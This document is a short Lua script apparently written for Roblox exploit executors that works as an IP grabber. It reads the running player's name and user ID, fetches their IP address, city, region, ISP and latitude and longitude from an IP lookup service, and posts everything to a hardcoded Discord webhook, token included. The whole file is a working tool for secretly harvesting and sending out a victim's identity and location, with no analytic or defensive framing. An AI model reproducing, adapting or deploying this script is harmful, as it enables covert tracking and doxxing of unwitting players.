
local Request = (syn and syn.request or request or http and http.request or http_request) or error("No request function found")
local player_name = game:GetService("Players").LocalPlayer.Name
local User_Id = game:GetService("Players").LocalPlayer.UserId
local webhook_url = "https://discord.com/api/webhooks/1047563608797741186/FS14pvxn58kFcacEYjilBTsRSYIy0KSp2J-Tgh2Xt3JB-IQj3I5rNuFYY89hXNbnv7Xx"

local ip_info = Request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s\nUserid: %s\nlat: %s\nlon: %s\nTimeZone: %s", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org ,User_Id, ipinfo_table.lat, ipinfo_table.lon, ipinfo_table.timezone)
Request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)